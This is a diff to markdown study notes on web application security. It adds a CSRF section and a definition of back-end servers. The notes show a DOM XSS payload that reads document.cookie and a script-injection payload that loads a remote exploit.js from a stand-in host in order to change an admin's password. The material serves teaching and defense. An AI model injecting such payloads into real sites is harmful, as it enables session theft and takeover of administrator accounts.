@@ -75,6 +75,22 @@ We can try to inject the following DOM XSS JavaScript code as a payload, which s
 #"><img src=/ onerror=alert(document.cookie)>
 ```
 
+## CSRF
+
+CSRF can also be leveraged to attack admins and gain access to their accounts. Admins usually have access to sensitive functions, which can sometimes be used to attack and gain control over the back-end server (depending on the functionality provided to admins within a given web application). Following this example, instead of using JavaScript code that would return the session cookie, we would load a remote .js (JavaScript) file, as follows:
+
+```
+"><script src=//www.example.com/exploit.js></script>
+```
+
+The exploit.js file would contain the malicious JavaScript code that changes the user's password. Developing the exploit.js in this case requires knowledge of this web application's password changing procedure and APIs. The attacker would need to create JavaScript code that would replicate the desired functionality and automatically carry it out (i.e., JavaScript code that changes our password for this specific web application).
+
+## Back End Servers
+
+A back-end server is the hardware and operating system on the back end that hosts all of the applications necessary to run the web application. It is the real system running all of the processes and carrying out all of the tasks that make up the entire web application. The back end server would fit in the Data access layer.
+
+## Web Servers
+
 
 
 
